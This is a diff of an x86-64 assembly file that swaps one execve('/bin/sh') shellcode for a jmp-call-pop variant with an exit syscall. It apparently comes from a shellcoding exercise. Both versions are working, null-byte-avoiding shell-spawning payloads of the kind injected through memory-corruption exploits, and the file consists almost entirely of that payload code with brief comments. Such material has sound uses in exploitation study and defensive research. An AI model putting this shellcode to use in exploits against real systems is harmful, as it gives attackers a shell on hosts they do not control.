@@ -1,18 +1,35 @@
 global _start
 
 section .text
-      
+
 _start:
-    	xor rdi,rdi     		; rdi null
-    	push rdi        		; null
-    	push rdi        		; null
-    	pop rsi         		; argv null
-    	pop rdx         		; envp null
-	mov rdi, 0x68732f6e69622f2f 	; hs/nib//
-    	shr rdi, 0x08    		; no nulls, so shr to get \0
-    	push rdi        		; \0hs/nib/
-    	push rsp      
-    	pop rdi         		; pointer to arguments
-    	push 0x3b       		; execve
-    	pop rax         
-    	syscall         		; make the call
+
+	jmp message		; push "/bin/sh" onto the stack
+
+mystart:
+	xor	rax, rax	; make rax - NULL
+	push	rax		; push NULL onto stack
+	pop 	rdx 		; third parameter - NULL
+	pop 	rdi 		; first parameter - "/bin/sh"
+	push	rax		; push NULL onto stack
+	mov 	rax, rdi	; copy RDI into RAX
+	push	rax		; push "/bin/sh" onto the stack
+	push	rsp		; assign pointer to start of the stack
+	pop 	rsi 		; second parameter - pointer to {"/bin/sh", NULL} 
+	xor 	rax, rax	; clear RAX
+	mov 	al, 0x3b	; syscall number for __execve
+	syscall
+	
+	; exit syscall
+	xor 	rax, rax
+	mov 	al, 0x3c
+	xor 	rdi, rdi
+	mov 	dil, 0x0a
+	syscall
+	
+	message:
+	
+	call 	mystart
+	db 	"/bin/sh"
+	
+section .data
